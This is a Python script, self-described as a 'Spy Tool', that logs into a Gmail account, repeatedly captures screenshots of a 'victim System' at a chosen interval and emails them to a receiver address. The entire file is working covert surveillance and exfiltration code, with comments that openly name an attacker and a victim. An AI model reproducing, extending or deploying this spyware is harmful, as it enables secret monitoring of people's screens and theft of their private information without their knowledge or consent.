# A Spy Tool Using Python.
# done by @Sri_Programmer
# python v3.7.2

# Imports

import smtplib
import getpass
import time
import os
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage


class ImageGrabber:

    # This Constructor is used for email login for attacker
    def __init__(self):
        self.emailid = None
        self.password = None
        self.message = None
        self.toMailid = None
        self.imageTimeGap = None
        self.server = None
        self.login()
        self.victimSetup()
        self.attack()
        # Creating a server object
        
    def login(self):    # Attacker Login

        print('Connecting to the server...')
        try:
            self.server = smtplib.SMTP('smtp.gmail.com',587)
            self.server.starttls()
        except smtplib.SMTPConnectError:
            print('SMTP Connectivity Error')
            quit()
        except ConnectionResetError:
            print('Connection was Reset by peer')
            quit()
        except smtplib.SMTPServerDisconnected:
            print('Server disconnected')
            quit()
        except KeyboardInterrupt:
            quit()
        except Exception:
            print('Internet Connectivity Issue: Please check your Internet connection.')
            quit()

        self.emailid = input('Enter your Emailid:')
        self.password = getpass.getpass('Enter your Email password:')
        try:
            self.server.login(self.emailid, self.password)
            print('[+] Login Sucessfull...!')
        except smtplib.SMTPAuthenticationError:
            print('Authentication Error')
            quit()
        except smtplib.SMTPConnectError:
            print('Internet Connectivity issue: Please Check your internet connection.')
            quit()
        except KeyboardInterrupt:
            quit()
        except Exception:
            print('Something went Wrong...!')
            quit()

    def victimSetup(self):
        self.message = MIMEMultipart()
        self.message['From'] = self.emailid
        self.toMailid = input('Enter Receiver Email Id: ')
        self.imageTimeGap = int(input('Enter the time delay between images:'))
        self.message['To'] = self.toMailid
        self.message['Subject'] = 'Images form the victim System.'

    
    def attack(self):

        try:
            while True:
                time.sleep(self.imageTimeGap)
                image = ImageGrab.grab()
                image.save(os.getcwd() + 'image.png')
                image_file = open(os.getcwd() + 'image.png', 'rb')
                self.message.attach(MIMEImage(image_file.read()))
                self.server.sendmail(self.emailid, self.toMailid, self.message.as_string())

        except KeyboardInterrupt:
            print('\n')
            quit()
ImageGrabber()